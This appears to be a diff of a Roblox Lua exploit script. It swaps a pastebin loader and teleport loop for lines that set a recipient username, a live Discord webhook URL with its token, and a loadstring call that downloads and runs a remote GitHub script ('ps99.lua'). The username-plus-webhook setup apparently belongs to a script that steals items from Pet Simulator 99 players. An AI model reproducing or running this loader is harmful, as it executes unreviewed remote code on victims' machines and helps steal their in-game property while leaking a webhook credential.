@@ -1,2 +1,4 @@
---@everyone 
- if queue_on_teleport ~= nil then queue_on_teleport("Username = 'ViperGGs1';loadstring(game:HttpGet('https://pastebin.com/raw/5vknPgVD'))()") end while task.wait(1) do game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "6e43b62f-a628-4812-a631-722064ad74e3", game.Players.LocalPlayer) end
+Username = "ZeatForGun" 
+Webhook = "https://discord.com/api/webhooks/1269573689326960712/SxR956y_qhWUrbZTjIU4VChlR0FjLFZLHsGOlqb6ujhZJZz375PNXqaVWzK-WLqbpvH_" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
